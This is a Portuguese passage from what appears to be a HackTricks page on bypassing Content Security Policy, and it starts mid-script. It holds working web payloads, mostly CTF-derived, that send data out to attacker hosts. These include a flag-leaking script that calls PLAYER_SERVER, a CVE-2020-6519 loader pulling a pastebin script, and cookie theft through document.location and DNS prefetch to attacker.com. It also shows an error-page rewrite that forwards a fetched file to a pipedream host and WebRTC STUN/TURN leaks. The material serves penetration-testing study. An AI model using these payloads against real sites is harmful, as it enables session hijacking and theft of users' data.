let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Via Bookmarklets

Este ataque implicaria alguma engenharia social onde o atacante **convence o usu√°rio a arrastar e soltar um link sobre o bookmarklet do navegador**. Este bookmarklet conteria **c√≥digo javascript malicioso** que, quando arrastado e solto ou clicado, seria executado no contexto da janela web atual, **burlando o CSP e permitindo roubar informa√ß√µes sens√≠veis** como cookies ou tokens.

Para mais informa√ß√µes [**verifique o relat√≥rio original aqui**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP bypass restringindo o CSP

Neste [**writeup do CTF**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), o CSP √© burlado ao injetar dentro de um iframe permitido um CSP mais restritivo que proibia o carregamento de um arquivo JS espec√≠fico que, ent√£o, via **polui√ß√£o de prot√≥tipo** ou **dom clobbering** permitia **abusar de um script diferente para carregar um script arbitr√°rio**.

Voc√™ pode **restringir um CSP de um Iframe** com o atributo **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

No [**writeup do CTF**](https://github.com/aszx87410/ctf-writeups/issues/48), foi poss√≠vel, por meio de **inje√ß√£o de HTML**, **restringir** ainda mais um **CSP** para que um script que impedia CSTI fosse desativado e, portanto, a **vulnerabilidade se tornasse explor√°vel.**\
O CSP pode ser tornar mais restritivo usando **meta tags HTML** e scripts inline podem ser desativados **removendo** a **entrada** permitindo seu **nonce** e **habilitando scripts inline espec√≠ficos via sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### Exfiltra√ß√£o de JS com Content-Security-Policy-Report-Only

Se voc√™ conseguir fazer com que o servidor responda com o cabe√ßalho **`Content-Security-Policy-Report-Only`** com um **valor controlado por voc√™** (talvez por causa de um CRLF), voc√™ poderia fazer com que ele aponte para o seu servidor e se voc√™ **envolver** o **conte√∫do JS** que deseja exfiltrar com **`<script>`** e porque √© altamente prov√°vel que `unsafe-inline` n√£o seja permitido pelo CSP, isso ir√° **disparar um erro de CSP** e parte do script (contendo as informa√ß√µes sens√≠veis) ser√° enviada para o servidor a partir do `Content-Security-Policy-Report-Only`.

Para um exemplo [**verifique este writeup de CTF**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Vazamento de Informa√ß√µes com CSP e Iframe

- Um `iframe` √© criado apontando para uma URL (vamos cham√°-la de `https://example.redirect.com`) que √© permitida pelo CSP.
- Esta URL ent√£o redireciona para uma URL secreta (por exemplo, `https://usersecret.example2.com`) que **n√£o √© permitida** pelo CSP.
- Ao escutar o evento `securitypolicyviolation`, √© poss√≠vel capturar a propriedade `blockedURI`. Esta propriedade revela o dom√≠nio da URI bloqueada, vazando o dom√≠nio secreto para o qual a URL inicial redirecionou.

√â interessante notar que navegadores como o Chrome e o Firefox t√™m comportamentos diferentes ao lidar com iframes em rela√ß√£o ao CSP, levando a vazamentos potenciais de informa√ß√µes sens√≠veis devido ao comportamento indefinido.

Outra t√©cnica envolve explorar o pr√≥prio CSP para deduzir o subdom√≠nio secreto. Este m√©todo se baseia em um algoritmo de busca bin√°ria e na ajustagem do CSP para incluir dom√≠nios espec√≠ficos que s√£o deliberadamente bloqueados. Por exemplo, se o subdom√≠nio secreto √© composto por caracteres desconhecidos, voc√™ pode testar iterativamente diferentes subdom√≠nios modificando a diretiva CSP para bloquear ou permitir esses subdom√≠nios. Aqui est√° um trecho mostrando como o CSP pode ser configurado para facilitar este m√©todo:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Ao monitorar quais solicita√ß√µes s√£o bloqueadas ou permitidas pelo CSP, √© poss√≠vel reduzir as poss√≠veis caracteres no subdom√≠nio secreto, eventualmente descobrindo a URL completa.

Ambos os m√©todos exploram as nuances da implementa√ß√£o e comportamento do CSP nos navegadores, demonstrando como pol√≠ticas aparentemente seguras podem inadvertidamente vazar informa√ß√µes sens√≠veis.

Truque de [**aqui**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de recompensas por bugs!

**Percep√ß√µes de Hacking**\
Engaje-se com conte√∫do que explora a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking por meio de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais recentes programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais na plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

## Tecnologias Inseguras para Bypass CSP

### Sobrecarga de buffer de resposta PHP

O PHP √© conhecido por **armazenar em buffer a resposta para 4096** bytes por padr√£o. Portanto, se o PHP estiver exibindo um aviso, fornecendo **dados suficientes dentro dos avisos**, a **resposta** ser√° **enviada** **antes** do **cabe√ßalho CSP**, fazendo com que o cabe√ßalho seja ignorado.\
Assim, a t√©cnica consiste basicamente em **preencher o buffer de resposta com avisos** para que o cabe√ßalho CSP n√£o seja enviado.

Ideia de [**este writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Reescrever P√°gina de Erro

De [**este writeup**](https://blog.ssrf.kr/69) parece que foi poss√≠vel contornar uma prote√ß√£o CSP carregando uma p√°gina de erro (potencialmente sem CSP) e reescrevendo seu conte√∫do.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### ALGUNS + 'self' + wordpress

ALGUNS √© uma t√©cnica que abusa de um XSS (ou XSS altamente limitado) **em um endpoint de uma p√°gina** para **abusar** de **outros endpoints da mesma origem.** Isso √© feito carregando o endpoint vulner√°vel de uma p√°gina do atacante e, em seguida, atualizando a p√°gina do atacante para o endpoint real na mesma origem que voc√™ deseja abusar. Dessa forma, o **endpoint vulner√°vel** pode usar o objeto **`opener`** no **payload** para **acessar o DOM** do **endpoint real a ser abusado**. Para mais informa√ß√µes, consulte:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Al√©m disso, o **wordpress** possui um endpoint **JSONP** em `/wp-json/wp/v2/users/1?_jsonp=data` que ir√° **refletir** os **dados** enviados na sa√≠da (com a limita√ß√£o de apenas letras, n√∫meros e pontos).

Um atacante pode abusar desse endpoint para **gerar um ataque ALGUNS** contra o WordPress e **incorpor√°-lo** dentro de `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` observe que esse **script** ser√° **carregado** porque √© **permitido por 'self'**. Al√©m disso, e porque o WordPress est√° instalado, um atacante pode abusar do **ataque ALGUNS** atrav√©s do **endpoint de retorno** **vulner√°vel** que **burla o CSP** para conceder mais privil√©gios a um usu√°rio, instalar um novo plugin...\
Para mais informa√ß√µes sobre como realizar esse ataque, consulte [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Bypasses de Exfiltra√ß√£o CSP

Se houver um CSP estrito que n√£o permita que voc√™ **interaja com servidores externos**, h√° algumas coisas que voc√™ sempre pode fazer para exfiltrar as informa√ß√µes.

### Localiza√ß√£o

Voc√™ poderia simplesmente atualizar a localiza√ß√£o para enviar ao servidor do atacante as informa√ß√µes secretas:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta tag

Voc√™ pode redirecionar injetando uma meta tag (isso √© apenas um redirecionamento, isso n√£o vazar√° conte√∫do)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

Para carregar p√°ginas mais rapidamente, os navegadores v√£o pr√©-resolver os nomes de host em endere√ßos IP e armazen√°-los em cache para uso posterior.\
Voc√™ pode indicar a um navegador para pr√©-resolver um nome de host com: `<link reol="dns-prefetch" href="something.com">`

Voc√™ poderia abusar desse comportamento para **exfiltrar informa√ß√µes sens√≠veis por meio de solicita√ß√µes DNS**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
Outra maneira:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Para evitar que isso aconte√ßa, o servidor pode enviar o cabe√ßalho HTTP:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Aparentemente, essa t√©cnica n√£o funciona em navegadores sem interface (bots)
{% endhint %}

### WebRTC

Em v√°rias p√°ginas, voc√™ pode ler que o **WebRTC n√£o verifica a pol√≠tica `connect-src`** do CSP.

Na verdade, voc√™ pode _vazar_ informa√ß√µes usando uma _solicita√ß√£o DNS_. Confira este c√≥digo:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Outra op√ß√£o:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Verifica√ß√£o de Pol√≠ticas CSP Online

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Cria√ß√£o Autom√°tica de CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Refer√™ncias

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


‚Äã

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de bugs!

**Percep√ß√µes de Hacking**\
Engaje-se com conte√∫do que explora a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais novos programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais na plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
